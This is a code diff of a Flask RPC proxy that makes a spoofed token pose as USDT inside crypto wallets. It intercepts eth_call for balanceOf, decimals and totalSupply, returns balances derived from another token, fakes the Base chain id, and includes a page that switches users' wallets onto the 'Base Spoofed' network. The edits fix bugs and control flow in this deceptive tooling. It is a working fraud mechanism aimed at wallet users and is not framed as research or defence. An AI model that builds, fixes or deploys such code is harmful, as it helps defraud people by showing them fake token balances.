@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify, render_template_string, redirect
+from flask import Flask, request, jsonify, render_template_string
 import requests
 import os
 from web3 import Web3
@@ -36,10 +36,9 @@ def handle_rpc():
     app.logger.info(f"RPC Request: {data}")
     if method == "eth_chainId":
         return jsonify({"jsonrpc": "2.0", "id": call_id, "result": "0x2105"})
-    if method in ["wallet_switchEthereumChain", "wallet_addEthereumChain"]:
+    elif method in ["wallet_switchEthereumChain", "wallet_addEthereumChain"]:
         return jsonify({"jsonrpc": "2.0", "id": call_id, "result": "0x2105" if method == "wallet_switchEthereumChain" else True})
-
-    if method == "eth_call" and data.get("params") and len(data["params"]) > 0:
+    elif method == "eth_call" and data.get("params") and len(data["params"]) > 0:
         call_obj = data["params"][0]
         if call_obj.get("to") and call_obj["to"].lower() == SPOOFED_USDT.lower():
             data_field = call_obj.get("data", "")
@@ -56,10 +55,11 @@ def handle_rpc():
                     if STBL_DECIMALS != 6:
                         real_balance = real_balance * (10 ** (6 - STBL_DECIMALS))
                     result = "0x" + hex(real_balance)[2:].zfill(64)
+                    return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})
                 except Exception as e:
                     app.logger.error(f"Balance query failed for {address}: {str(e)}")
                     result = "0x" + hex(0)[2:].zfill(64)
-                return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})
+                    return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})
 
             elif function_signature == "0x313ce567":  # decimals
                 result = "0x" + hex(6)[2:].zfill(64)
@@ -87,7 +87,7 @@ def handle_rpc():
                 result = "0x" + hex(USDT_TOTAL_SUPPLY)[2:].zfill(64)
                 return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})
 
-    response = requests.post(BASE_RPC, json=data, headers={"Content-Type": "application/json"))
+    response = requests.post(BASE_RPC, json=data, headers={"Content-Type": "application/json"})
     return jsonify(response.json())
 
 @app.route('/add')
@@ -222,7 +222,6 @@ def add_token():
                     return;
                 }
                 try {
-                    // Switch to Base Spoofed to ensure RPC is used
                     await window.ethereum.request({
                         method: 'wallet_switchEthereumChain',
                         params: [{ chainId: '0x2105' }]
